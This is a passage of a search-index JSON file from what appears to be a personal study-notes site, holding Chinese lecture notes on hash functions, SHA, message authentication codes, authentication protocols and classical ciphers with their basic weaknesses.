SHA-1\u7b97\u6cd5\u64cd\u4f5c\u9996\u5148\u5bf9\u8f93\u5165\u6d88\u606f\u5212\u5206\u4e3a512-bit\u5757\uff0c\u82e5\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757\u4e0d\u6ee1\u8db3\u957f\u5ea6\u8981\u6c42\uff0c\u6309\u7167\u4e00\u5b9a\u89c4\u5219\u8fdb\u884c\u586b\u5145\u4e3a512-bit\u5757\u3002 \u7136\u540e\u6bcf\u4e2a512-bit\u5757\u91cd\u590d\u4f7f\u7528\u5206\u5757\u5904\u7406\u51fd\u6570\uff0c\u6700\u7ec8\u8f93\u51fa160 bits\u54c8\u5e0c\u503c\u3002 \u6d88\u606f\u8ba4\u8bc1\u7801 # \u57fa\u4e8e\u5206\u7ec4\u5bc6\u7801\u7684MAC # \u57fa\u4e8eHash\u7684MAC # MAC\u7684\u7279\u70b9 # \u63a5\u6536\u65b9\u53ef\u4ee5\u76f8\u4fe1\u6d88\u606f\u672a\u88ab\u4fee\u6539 \u63a5\u6536\u65b9\u53ef\u4ee5\u76f8\u4fe1\u6d88\u606f\u6765\u81ea\u771f\u6b63\u7684\u53d1\u9001\u65b9 \u5982\u679c\u6d88\u606f\u4e2d\u542b\u6709\u5e8f\u5217\u53f7\uff0c\u90a3\u4e48\u63a5\u6536\u65b9\u53ef\u4ee5\u76f8\u4fe1\u6d88\u606f\u987a\u5e8f\u662f\u6b63\u786e\u7684 MAC\u51fd\u6570\u4e0e\u52a0\u5bc6\u7684\u533a\u522b\u4e4b\u4e00\u662f\uff0cMAC\u7b97\u6cd5\u4e0d\u8981\u6c42\u53ef\u9006\u6027 MAC\u4e0d\u80fd\u63d0\u4f9b\u6570\u5b57\u7b7e\u540d","title":"Hash\u51fd\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%83%E7%AB%A0%20Hash%E5%87%BD%E6%95%B0/#hash\u51fd\u6570","text":"","title":"Hash\u51fd\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%83%E7%AB%A0%20Hash%E5%87%BD%E6%95%B0/#\u6982\u8ff0","text":"HASH\u51fd\u6570\u53c8\u79f0\u4e3a\u54c8\u5e0c\u51fd\u6570\u3001Hash\u51fd\u6570\u3001\u6742\u51d1\u51fd\u6570\u548c\u6563\u5217\u51fd\u6570\uff0c\u5728\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e2d\u626e\u6f14\u7740\u91cd\u8981\u89d2\u8272\u3002 Hash\u51fd\u6570\u662f\u4e00\u516c\u5f00\u51fd\u6570\uff0c\u901a\u5e38\u8bb0\u4e3aH\u6216h\uff0c\u672c\u7ae0\u8282\u4e2d\u4f7f\u7528H\u8868\u793aHash\u51fd\u6570\u3002Hash\u51fd\u6570\u53ef\u4ee5\u5c06\u4efb\u610f\u957f\u7684\u6d88\u606fm\u6620\u5c04\u4e3a\u8f83\u77ed\u7684\u3001\u56fa\u5b9a\u957f\u5ea6\u7684\u4e00\u4e2a\u503c\uff0c\u8bb0\u4e3a\ud835\udc3b(\ud835\udc5a)\uff0c\u7ecf\u5e38\u79f0\u51fd\u6570\u503c\ud835\udc6f(\ud835\udc8e)\u4e3a\u6563\u5217\u503c\u3001\u54c8\u5e0c\u503c\u3001\u6742\u51d1\u503c\u3001\u6742\u51d1\u7801\u6216\u6d88\u606f\u6458\u8981\u3001\u6570\u5b57\u6307\u7eb9\uff0c\u672c\u7ae0\u8282\u4e2d\uff0c\u51fd\u6570\u503c\ud835\udc3b(\ud835\udc5a)\u7684\u503c\u79f0\u4e3a\u54c8\u5e0c\u503c\u3002 \u4ece\u5bc6\u7801\u7b97\u6cd5\u89d2\u5ea6\u770b\uff0cHash\u51fd\u6570\u4e5f\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u79cd\u5355\u5411\u5bc6\u7801\u4f53\u5236\uff0c\u5373\u5b83\u4ece\u4e00\u4e2a\u660e\u6587\u5230\u5bc6\u6587\u662f\u4e0d\u53ef\u9006\u6620\u5c04\uff0c\u53ea\u6709\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u4e0d\u80fd\u89e3\u5bc6\u3002 \u54c8\u5e0c\u503c\u662f\u6d88\u606f\u4e2d\u6240\u6709\u6bd4\u7279\u7684\u51fd\u6570\uff0c\u56e0\u6b64\u63d0\u4f9b\u4e86\u4e00\u79cd\u9519\u8bef\u68c0\u6d4b\u80fd\u529b\uff0c\u5373\u6539\u53d8\u6d88\u606f\u4e2d\u4efb\u4f55\u4e00\u4e2a\u6bd4\u7279\u6216\u51e0\u4e2a\u6bd4\u7279\u90fd\u4f1a\u4f7f\u54c8\u5e0c\u503c\u53d1\u751f\u6539\u53d8\u3002\u5728\u5bc6\u7801\u5b66\u548c\u6570\u636e\u5b89\u5168\u6280\u672f\u4e2d\uff0cHash\u51fd\u6570\u662f\u5b9e\u73b0\u6709\u6548\u3001\u5b89\u5168\u53ef\u9760\u6570\u5b57\u7b7e\u540d\u548c\u8ba4\u8bc1\u7684\u91cd\u8981\u5de5\u5177\uff0c\u662f\u5b89\u5168\u8ba4\u8bc1\u534f\u8bae\u4e2d\u7684\u91cd\u8981\u6a21\u5757\u3002","title":"\u6982\u8ff0"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%83%E7%AB%A0%20Hash%E5%87%BD%E6%95%B0/#\u54c8\u5e0c\u51fd\u6570\u8981\u6c42","text":"\u5bf9\u4e8eH\u6709\u4e0b\u9762\u516d\u4e2a\u8981\u6c42\uff1a 1. \u80fd\u591f\u63a5\u53d7\u4efb\u610f\u957f\u5ea6\u7684\u6d88\u606f\u4f5c\u4e3a\u8f93\u5165\uff1b 2. \u80fd\u591f\u751f\u6210\u8f83\u77ed\u7684\u56fa\u5b9a\u957f\u5ea6\u7684\u8f93\u51fa\uff1b 3. \u5bf9\u4efb\u4f55\u6d88\u606f\u8f93\u5165\u90fd\u80fd\u591f\u5bb9\u6613\u548c\u5feb\u901f\u5730\u8ba1\u7b97\u51fa\u54c8\u5e0c\u503c\uff1b 4. \u5e94\u8be5\u5177\u6709\u5355\u5411\u6027\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u7ed9\u5b9a\ud835\udc3b(\ud835\udc5a)\uff0c\u6062\u590d\u6d88\u606fm\u5728\u8ba1\u7b97\u4e0a\u662f\u4e0d\u53ef\u884c\u7684\uff1b 5. \u5e94\u8be5\u80fd\u591f\u62b5\u6297\u5f31\u78b0\u649e\uff0c\u5373\u7ed9\u5b9a\u6d88\u606fm\u548c\ud835\udc3b(\ud835\udc5a)\uff0c\u627e\u5230\u53e6\u5916\u4e00\u4e2a\u6d88\u606f\ud835\udc5a\u2260\ud835\udc5a \u2032\uff0c\u4f7f\ud835\udc3b(\ud835\udc5a)=\ud835\udc3b(\ud835\udc5a \u2032)\u662f\u4e0d\u53ef\u80fd\uff1b 6. \u5e94\u8be5\u80fd\u591f\u62b5\u6297\u5f3a\u51b2\u7a81\uff0c\u5373\u53ef\u4ee5\u4e24\u4e2a\u6709\u610f\u4e49\u7684\u6d88\u606fm\u548c\ud835\udc5a \u2032\uff0c\u4f7f\u5f97\ud835\udc3b(\ud835\udc5a)=\ud835\udc3b(\ud835\udc5a \u2032)\u51e0\u4e4e\u662f\u4e0d\u53ef\u80fd\u7684\u3002","title":"\u54c8\u5e0c\u51fd\u6570\u8981\u6c42"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%83%E7%AB%A0%20Hash%E5%87%BD%E6%95%B0/#\u54c8\u5e0c\u51fd\u6570\u7279\u6027","text":"\u5355\u5411\u6027\uff08\u6297\u539f\u50cf\uff09\uff1a\u5bf9\u5e72\u4efb\u610f\u7ed9\u5b9a\u7684\u6d88\u606f\uff0c\u8ba1\u7b97\u5176\u54c8\u5e0c\u503c\u5bb9\u6613. \u4f46\u662f\uff0c\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u54c8\u5e0c\u503ch\uff0c\u8981\u627e\u5230M\u4f7f\u5f97H(M)\uff1dh\u5728\u8ba1\u7b97\u4e0a\u662f\u4e0d\u53ef\u884c\u7684. \u5f31\u6297\u78b0\u649e\uff08\u6297\u4e8c\u6b21\u539f\u50cf\uff09\uff1a\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u6d88\u606fM1\uff0c\u8981\u53d1\u73b0\u53e6\u4e00\u4e2a\u6d88\u606fM2\uff0c\u6ee1\u8db3H( M1 )\uff1dH(M2)\u5728\u8ba1\u7b97\u4e0a\u662f\u4e0d\u53ef\u884c\u7684. \u5f3a\u6297\u78b0\u649e\uff1a\u627e\u4efb\u610f\u4e00\u5bf9\u4e0d\u540c\u7684\u6d88\u606fM1\uff0cM2 \uff0c\u4f7fH(M1)\uff1dH(M2 )\u5728\u8ba1\u7b97\u4e0a\u662f\u4e0d\u53ef\u884c\u7684. \u968f\u673a\u6027","title":"\u54c8\u5e0c\u51fd\u6570\u7279\u6027"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%83%E7%AB%A0%20Hash%E5%87%BD%E6%95%B0/#sha\u7cfb\u5217","text":"SHA-1\uff0cSHA-256\uff0cSHA-384\uff0cSHA-512 SHA-1\uff0cSHA-256\u7684\u5206\u7ec4\u5927\u5c0f\u662f512 SHA-384\uff0cSHA-512\u7684\u5206\u7ec4\u5927\u5c0f\u662f1024 SHA-1\u8f93\u51fa\u7684\u6458\u8981\u662f160bit SHA-256\u8f93\u51fa\u7684\u6458\u8981\u662f256 bit SHA-384\u8f93\u51fa\u7684\u6458\u8981\u662f384 bit SHA-512\u8f93\u51fa\u7684\u6458\u8981\u662f512 bit","title":"SHA\u7cfb\u5217"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%83%E7%AB%A0%20Hash%E5%87%BD%E6%95%B0/#sha-1","text":"NIST\u57281993\u5e74\u53d1\u5e03\u4e86\u4e00\u4e2a\u54c8\u5e0c\u7b97\u6cd5\u79f0\u4e3a\u5b89\u5168HASH\u7b97\u6cd5\uff0c1995\u5e74\u4fee\u6539\uff0c\u4fee\u6539\u540e\u7684\u7248\u672c\u662fSHA-1\uff0c\u8fd9\u4e2a\u7248\u672c\u662f\u5f53\u524d\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u54c8\u5e0c\u7b97\u6cd5\u3002 SHA-1\u63a5\u53d7\u8f93\u5165\u6d88\u606f\u7684\u6700\u5927\u957f\u5ea6\u4e3a264-1 bits\uff0c\u751f\u6210160 bits\u7684\u6d88\u606f\u6458\u8981\u3002 SHA-1\u7b97\u6cd5\u64cd\u4f5c\u9996\u5148\u5bf9\u8f93\u5165\u6d88\u606f\u5212\u5206\u4e3a512-bit\u5757\uff0c\u82e5\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757\u4e0d\u6ee1\u8db3\u957f\u5ea6\u8981\u6c42\uff0c\u6309\u7167\u4e00\u5b9a\u89c4\u5219\u8fdb\u884c\u586b\u5145\u4e3a512-bit\u5757\u3002 \u7136\u540e\u6bcf\u4e2a512-bit\u5757\u91cd\u590d\u4f7f\u7528\u5206\u5757\u5904\u7406\u51fd\u6570\uff0c\u6700\u7ec8\u8f93\u51fa160 bits\u54c8\u5e0c\u503c\u3002","title":"SHA-1"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%83%E7%AB%A0%20Hash%E5%87%BD%E6%95%B0/#\u6d88\u606f\u8ba4\u8bc1\u7801","text":"","title":"\u6d88\u606f\u8ba4\u8bc1\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%83%E7%AB%A0%20Hash%E5%87%BD%E6%95%B0/#\u57fa\u4e8e\u5206\u7ec4\u5bc6\u7801\u7684mac","text":"","title":"\u57fa\u4e8e\u5206\u7ec4\u5bc6\u7801\u7684MAC"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%83%E7%AB%A0%20Hash%E5%87%BD%E6%95%B0/#\u57fa\u4e8ehash\u7684mac","text":"","title":"\u57fa\u4e8eHash\u7684MAC"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%83%E7%AB%A0%20Hash%E5%87%BD%E6%95%B0/#mac\u7684\u7279\u70b9","text":"\u63a5\u6536\u65b9\u53ef\u4ee5\u76f8\u4fe1\u6d88\u606f\u672a\u88ab\u4fee\u6539 \u63a5\u6536\u65b9\u53ef\u4ee5\u76f8\u4fe1\u6d88\u606f\u6765\u81ea\u771f\u6b63\u7684\u53d1\u9001\u65b9 \u5982\u679c\u6d88\u606f\u4e2d\u542b\u6709\u5e8f\u5217\u53f7\uff0c\u90a3\u4e48\u63a5\u6536\u65b9\u53ef\u4ee5\u76f8\u4fe1\u6d88\u606f\u987a\u5e8f\u662f\u6b63\u786e\u7684 MAC\u51fd\u6570\u4e0e\u52a0\u5bc6\u7684\u533a\u522b\u4e4b\u4e00\u662f\uff0cMAC\u7b97\u6cd5\u4e0d\u8981\u6c42\u53ef\u9006\u6027 MAC\u4e0d\u80fd\u63d0\u4f9b\u6570\u5b57\u7b7e\u540d","title":"MAC\u7684\u7279\u70b9"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE/","text":"\u8ba4\u8bc1\u534f\u8bae # \u5355\u5411\u8ba4\u8bc1 # \u76ee\u524d\uff0c\u7535\u5b50\u90ae\u4ef6\u662f\u6700\u53d7\u6b22\u8fce\u7684\u901a\u4fe1\u5de5\u5177\uff0c\u5176\u4e3b\u8981\u4f18\u70b9\u662f\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\u65e0\u9700\u540c\u65f6\u5728\u7ebf\uff0c\u53ea\u662f\u7535\u5b50\u90ae\u4ef6\u88ab\u53d1\u5230\u63a5\u6536\u65b9\u7684\u90ae\u7bb1\u4e2d\uff0c\u88ab\u4fdd\u5b58\u4e0b\u6765\u76f4\u5230\u63a5\u6536\u65b9\u6765\u9605\u8bfb\u3002\u5982\u679c\u901a\u4fe1\u53cc\u65b9\u53ea\u9700\u8981\u4e00\u65b9\u88ab\u8ba4\u8bc1\uff0c\u8fd9\u6837\u7684\u8ba4\u8bc1\u8fc7\u7a0b\u5c31\u662f\u4e00\u79cd\u5355\u5411\u8ba4\u8bc1\uff0c\u4f8b\u5982\u53e3\u4ee4\u6838\u5bf9\u6cd5\u5b9e\u9645\u4e0a\u5c31\u662f\u4e00\u79cd\u5355\u5411\u8ba4\u8bc1\uff0c\u8fd9\u662f\u8fd9\u79cd\u7b80\u5355\u7684\u5355\u5411\u8ba4\u8bc1\u8fd8\u6ca1\u6709\u4e0e\u5bc6\u94a5\u5206\u53d1\u76f8\u7ed3\u5408\u3002 \u5206\u7c7b # \u91c7\u7528\u5bf9\u79f0\u5bc6\u7801\u6280\u672f\uff0c\u9700\u8981\u4e00\u4e2a\u53ef\u4fe1\u8d56\u7684\u7b2c\u4e09\u65b9\u2014\u2014\u901a\u5e38\u4e3a \u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3 \uff08 KDC \uff09\u6216 \u8ba4\u8bc1\u670d\u52a1\u5668 \uff08 AS \uff09 \u91c7\u7528\u975e\u5bf9\u79f0\u5bc6\u7801\u6280\u672f\uff0c\u65e0\u9700\u7b2c\u4e09\u65b9\u7684\u53c2\u4e0e\u3002 \u53cc\u5411\u8ba4\u8bc1 # \u5728\u53cc\u5411\u8ba4\u8bc1\u8fc7\u7a0b\u4e2d\uff0c\u901a\u4fe1\u53cc\u65b9\u9700\u8981\u4e92\u76f8\u8ba4\u8bc1\u5404\u81ea\u7684\u8eab\u4efd\uff0c\u7136\u540e\u4ea4\u6362\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u53cc\u5411\u8ba4\u8bc1\u7684\u5178\u578b\u65b9\u6848\u662f Needham/Schroeder \u534f\u8bae \u4f7f\u7528 \u65f6\u95f4\u6233 \u9632\u6b62\u91cd\u653e\u653b\u51fb","title":"\u8ba4\u8bc1\u534f\u8bae"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE/#\u8ba4\u8bc1\u534f\u8bae","text":"","title":"\u8ba4\u8bc1\u534f\u8bae"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE/#\u5355\u5411\u8ba4\u8bc1","text":"\u76ee\u524d\uff0c\u7535\u5b50\u90ae\u4ef6\u662f\u6700\u53d7\u6b22\u8fce\u7684\u901a\u4fe1\u5de5\u5177\uff0c\u5176\u4e3b\u8981\u4f18\u70b9\u662f\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\u65e0\u9700\u540c\u65f6\u5728\u7ebf\uff0c\u53ea\u662f\u7535\u5b50\u90ae\u4ef6\u88ab\u53d1\u5230\u63a5\u6536\u65b9\u7684\u90ae\u7bb1\u4e2d\uff0c\u88ab\u4fdd\u5b58\u4e0b\u6765\u76f4\u5230\u63a5\u6536\u65b9\u6765\u9605\u8bfb\u3002\u5982\u679c\u901a\u4fe1\u53cc\u65b9\u53ea\u9700\u8981\u4e00\u65b9\u88ab\u8ba4\u8bc1\uff0c\u8fd9\u6837\u7684\u8ba4\u8bc1\u8fc7\u7a0b\u5c31\u662f\u4e00\u79cd\u5355\u5411\u8ba4\u8bc1\uff0c\u4f8b\u5982\u53e3\u4ee4\u6838\u5bf9\u6cd5\u5b9e\u9645\u4e0a\u5c31\u662f\u4e00\u79cd\u5355\u5411\u8ba4\u8bc1\uff0c\u8fd9\u662f\u8fd9\u79cd\u7b80\u5355\u7684\u5355\u5411\u8ba4\u8bc1\u8fd8\u6ca1\u6709\u4e0e\u5bc6\u94a5\u5206\u53d1\u76f8\u7ed3\u5408\u3002","title":"\u5355\u5411\u8ba4\u8bc1"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE/#\u5206\u7c7b","text":"\u91c7\u7528\u5bf9\u79f0\u5bc6\u7801\u6280\u672f\uff0c\u9700\u8981\u4e00\u4e2a\u53ef\u4fe1\u8d56\u7684\u7b2c\u4e09\u65b9\u2014\u2014\u901a\u5e38\u4e3a \u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3 \uff08 KDC \uff09\u6216 \u8ba4\u8bc1\u670d\u52a1\u5668 \uff08 AS \uff09 \u91c7\u7528\u975e\u5bf9\u79f0\u5bc6\u7801\u6280\u672f\uff0c\u65e0\u9700\u7b2c\u4e09\u65b9\u7684\u53c2\u4e0e\u3002","title":"\u5206\u7c7b"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B9%9D%E7%AB%A0%20%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE/#\u53cc\u5411\u8ba4\u8bc1","text":"\u5728\u53cc\u5411\u8ba4\u8bc1\u8fc7\u7a0b\u4e2d\uff0c\u901a\u4fe1\u53cc\u65b9\u9700\u8981\u4e92\u76f8\u8ba4\u8bc1\u5404\u81ea\u7684\u8eab\u4efd\uff0c\u7136\u540e\u4ea4\u6362\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u53cc\u5411\u8ba4\u8bc1\u7684\u5178\u578b\u65b9\u6848\u662f Needham/Schroeder \u534f\u8bae \u4f7f\u7528 \u65f6\u95f4\u6233 \u9632\u6b62\u91cd\u653e\u653b\u51fb","title":"\u53cc\u5411\u8ba4\u8bc1"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/","text":"\u53e4\u5178\u5bc6\u7801\u4f53\u5236 # \u4ee3\u66ff\u5bc6\u7801 # \u5355\u5b57\u7b26\u5355\u8868\u4ee3\u66ff\u5bc6\u7801 # \u660e\u6587\u4e2d\u7684\u6240\u6709\u5b57\u7b26\u90fd\u4f7f\u7528\u4e00\u4e2a\u56fa\u5b9a\u7684\u6620\u5c04\u3002\uff08 \u51ef\u6492\u5bc6\u7801 \uff0c \u4eff\u5c04\u5bc6\u7801 \u7b49\uff09 \u4e58\u6cd5\u5bc6\u7801 # \u51ef\u6492\u5bc6\u7801 # \u4eff\u5c04\u5bc6\u7801 # \u4eff\u5c04\u5bc6\u7801\u5b89\u5168\u6027\u5206\u6790 # \u5bf9\u4e8e\u4eff\u5c04\u5bc6\u7801\uff0cc=e(p)= k p+b (mod 26)\uff0c\u56e0\u4e3ak\u8981\u548c26\u4e92\u8d28\uff0c\u5e76\u4e14\u8fd8\u8981\u53bb\u63891\uff0c\u5bc6\u94a5\u7a7a\u95f4\u53ea\u670911\u4e2a\uff0c\u4e0d\u80fd\u7ecf\u5f97\u8d77\u7a77\u4e3e\u5206\u6790 \u5355\u5b57\u7b26\u591a\u8868\u4ee3\u66ff\u5bc6\u7801 # \u7528\u4e00\u7cfb\u5217\uff08\u4e24\u4e2a\u4ee5\u4e0a\uff09\u66ff\u6362\u8868\u4f9d\u6b21\u5bf9\u660e\u6587\u7684\u5b57\u6bcd\u8fdb\u884c\u66ff\u6362\u7684\u52a0\u5bc6\u65b9\u6cd5\uff08 \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 \uff0cplayfair\u5bc6\u7801\uff0cHill\u5bc6\u7801\u7b49\uff09 \u7ef4\u5409\u5c3c\u4e9a\uff08Vigenere\uff09\u5bc6\u7801 # \u7ef4\u5409\u5c3c\u4e9a\uff08Vigenere\uff09\u5bc6\u7801\u5b89\u5168\u6027\u5206\u6790 # \u5df2\u77e5l\u4e2a\u8fde\u7eed\u7684\u660e\u6587\u548c\u5bc6\u6587\uff0c\u53ef\u4ee5\u6062\u590d\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7684\u5355\u8868\u79fb\u4f4d\u91cf\uff08\u5373\u5bc6\u94a5\uff09 \u7a77\u4e3e\u653b\u51fb\uff1a\u5df2\u77e5\u5bc6\u6587\uff0c\u660e\u6587\u4e3a\u6709\u610f\u4e49\u5b57\u7b26\uff0c\u81f3\u591a\u5c1d\u8bd526l \u4e2a\uff0c\u53ef\u4ee5\u6062\u590d\u660e\u6587 \u6362\u4f4d\u5bc6\u7801 # \u660e\u6587\u5b57\u6bcd\u4e0d\u53d8\uff0c\u4f46\u987a\u5e8f\u6253\u4e71 \u5217\u6362\u4f4d\uff1a\u9996\u5148\u5c06\u660e\u6587\u6309\u7167\u5bc6\u94a5\u4e2a\u6570\u6392\u5217\uff0c\u7136\u540e\u518d\u6309\u7167\u5bc6\u94a5\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u53d8\u6362\u5217\u7684\u987a\u5e8f\uff0c\u6700\u540e\u6309\u7167\u5217\u7684\u987a\u5e8f\u5199\u51fa\u7684\u5c31\u662f\u5bc6\u6587","title":"\u53e4\u5178\u5bc6\u7801\u4f53\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u53e4\u5178\u5bc6\u7801\u4f53\u5236","text":"","title":"\u53e4\u5178\u5bc6\u7801\u4f53\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u4ee3\u66ff\u5bc6\u7801","text":"","title":"\u4ee3\u66ff\u5bc6\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u5355\u5b57\u7b26\u5355\u8868\u4ee3\u66ff\u5bc6\u7801","text":"\u660e\u6587\u4e2d\u7684\u6240\u6709\u5b57\u7b26\u90fd\u4f7f\u7528\u4e00\u4e2a\u56fa\u5b9a\u7684\u6620\u5c04\u3002\uff08 \u51ef\u6492\u5bc6\u7801 \uff0c \u4eff\u5c04\u5bc6\u7801 \u7b49\uff09","title":"\u5355\u5b57\u7b26\u5355\u8868\u4ee3\u66ff\u5bc6\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u4e58\u6cd5\u5bc6\u7801","text":"","title":"\u4e58\u6cd5\u5bc6\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u51ef\u6492\u5bc6\u7801","text":"","title":"\u51ef\u6492\u5bc6\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u4eff\u5c04\u5bc6\u7801","text":"","title":"\u4eff\u5c04\u5bc6\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u4eff\u5c04\u5bc6\u7801\u5b89\u5168\u6027\u5206\u6790","text":"\u5bf9\u4e8e\u4eff\u5c04\u5bc6\u7801\uff0cc=e(p)= k p+b (mod 26)\uff0c\u56e0\u4e3ak\u8981\u548c26\u4e92\u8d28\uff0c\u5e76\u4e14\u8fd8\u8981\u53bb\u63891\uff0c\u5bc6\u94a5\u7a7a\u95f4\u53ea\u670911\u4e2a\uff0c\u4e0d\u80fd\u7ecf\u5f97\u8d77\u7a77\u4e3e\u5206\u6790","title":"\u4eff\u5c04\u5bc6\u7801\u5b89\u5168\u6027\u5206\u6790"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u5355\u5b57\u7b26\u591a\u8868\u4ee3\u66ff\u5bc6\u7801","text":"\u7528\u4e00\u7cfb\u5217\uff08\u4e24\u4e2a\u4ee5\u4e0a\uff09\u66ff\u6362\u8868\u4f9d\u6b21\u5bf9\u660e\u6587\u7684\u5b57\u6bcd\u8fdb\u884c\u66ff\u6362\u7684\u52a0\u5bc6\u65b9\u6cd5\uff08 \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 \uff0cplayfair\u5bc6\u7801\uff0cHill\u5bc6\u7801\u7b49\uff09","title":"\u5355\u5b57\u7b26\u591a\u8868\u4ee3\u66ff\u5bc6\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u7ef4\u5409\u5c3c\u4e9avigenere\u5bc6\u7801","text":"","title":"\u7ef4\u5409\u5c3c\u4e9a\uff08Vigenere\uff09\u5bc6\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u7ef4\u5409\u5c3c\u4e9avigenere\u5bc6\u7801\u5b89\u5168\u6027\u5206\u6790","text":"\u5df2\u77e5l\u4e2a\u8fde\u7eed\u7684\u660e\u6587\u548c\u5bc6\u6587\uff0c\u53ef\u4ee5\u6062\u590d\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7684\u5355\u8868\u79fb\u4f4d\u91cf\uff08\u5373\u5bc6\u94a5\uff09 